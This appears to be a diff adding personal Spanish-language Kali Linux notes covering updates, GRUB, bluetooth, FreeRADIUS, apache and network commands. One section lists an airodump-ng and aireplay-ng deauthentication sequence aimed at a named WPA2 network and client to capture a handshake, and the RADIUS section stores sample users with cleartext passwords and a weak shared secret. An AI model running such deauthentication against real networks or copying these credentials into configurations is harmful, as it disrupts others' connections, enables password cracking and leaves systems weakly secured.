@@ -1,0 +1,99 @@
+fhcontraesñas 1234567890, ko
+__________________________
+/////////Actualizar kali://///////////
+
+sudo apt-get update
+sudo apt-get dist-upgrade -y
+
+apt-get update && apt-get dist-upgrade -y 
+
+apt update && apt upgrade -y 
+apt autoremove -y
+reboot
+________________________________________________________________________________
+BSSID		      PWR,Beacons ,Data#/s,CH,MB, ENC, Cipher  AUTH ESSID
+		
+88:40:33:D7:1F:4C  -62       19        1    0   8  130   WPA2 CCMP   PSK  M4N3
+
+0.- airodump-ng wlan0mon   /o wifite
+
+1.- airodump-ng -c 8 --essid M4N3 wlan0mon 
+
+3.- aireplay-ng -0 8 -e M4NE -c 1A:4B:C2:4D:BE:EE -a 88:40:33:D7:1F:4C wlan0mon
+
+2.-airodump-ng -w capturado -c  8 --essid M4N3 wlan0mon
+
+________________________________________________________________________-
+////Actualizar Grub////////
+cd /boot/grub/themes/kali/      Cambiar el tema y unos archivos <linkdel video>
+sudo nano /etc/default/grub     
+update-grub
+___________________________________________________
+
+///////////////////niciar bluetucht///////////////	
+
+sudo systemctl disable bluetooth.service
+sudo systemctl enable bluetooth.service 
+sudo systemctl stop bluetooth.service
+sudo systemctl start bluetooth.service
+____________________________________________________
+
+cd /etc/freeradius/3.0  <para configurar radius, debemos de crear los usuarios y contraseñas>
+
+nano users <editamoes el archivo y colocamos la siguiente sin taxis>
+
+david Cleartext-Password := "guerillo"
+gael Cleartext-Password := "camara"
+invi Cleartext-Password := "contra"
+alexis Cleartext-Password := "morenillo"
+_____________________________________________________
+
+service freeradius restart <para reiniciar el servicio en casos de editar algun archivo o dirección ip>
+
+radtest <user> <password> 127.0.0.1 1812 testing 
+
+"<para probar el correcto funcionamineto de las sesiones y login">"
+
+///////////radiusd.conf/////////////// <para editar la direccion ip del router o access point>
+
+
+client 192.168.20.200{  	<dirección ip del router >
+        secret = radius   	<clave a colocar como clave compartida en servidor y router >
+        shortname = linksys 	<nombre, puede ser como tu quieras>
+
+
+________________________Pruebas de acceso_____________
+
+tail -f /var/log/freeradius/radius.log		<mostrara los inicios de sesión en la red>
+
+
+_____________Pagina web, _____________________________________
+
+systemctl enable apache2
+systemctl stop apache2
+systemctl restart apache2
+systemctl status apache2
+
+cd /var/www/html <mover la carpeta a esta ruta, cambiar los nombres de los index y eliminar si es necesario>
+Comprobar en el navegador.
+
+_______________Eliminar______________________________
+
+rm -r <directorios con contenido>
+rm <archivos para directorios o archivos vacios>
+
+/////////////Cambiar ip, y desactivar interfasces de red./////////////////////
+
+ifconfig eth0 down
+ifconfig eth0 192.168.20.110 netmask 255.255.255.0 
+ifconfig eth0 up
+
+
+________________________Mover o copiar_________________________________
+
+cp-mv /ruta/del/archivo /ruta/del/directorio/destino
+cp-mv documento.txt /home/usuario/documentos/
+
+
+
+
